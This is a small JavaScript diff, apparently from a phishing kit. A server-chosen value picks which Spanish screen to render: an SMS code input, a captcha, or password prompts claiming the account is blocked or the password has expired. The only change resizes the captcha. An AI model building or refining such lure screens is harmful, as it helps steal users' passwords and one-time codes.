@@ -30,7 +30,7 @@ setTimeout(function () {
     var d = ${JSON.stringify(destino)};
     document.getElementById('app').innerHTML = d === 'dentro' ? '<h1>Bienvenido</h1>'
       : d === 'sms' ? '<p>Te hemos enviado un código de verificación</p><input type="text" name="otp">'
-      : d === 'captcha' ? '<div class="g-recaptcha"></div>'
+      : d === 'captcha' ? '<div class="g-recaptcha" style="width:304px;height:78px"></div>'
       : d === 'bloqueo' ? '<form><input type="password" name="p"><p>Su usuario ha sido bloqueado por demasiados intentos</p></form>'
       : d === 'caducada' ? '<form><input type="password" name="p"><p>Su contraseña ha caducado. Debe cambiar su contraseña para continuar</p></form>'
       : '<form><input type="password" name="p"><p>Datos incorrectos</p></form>';
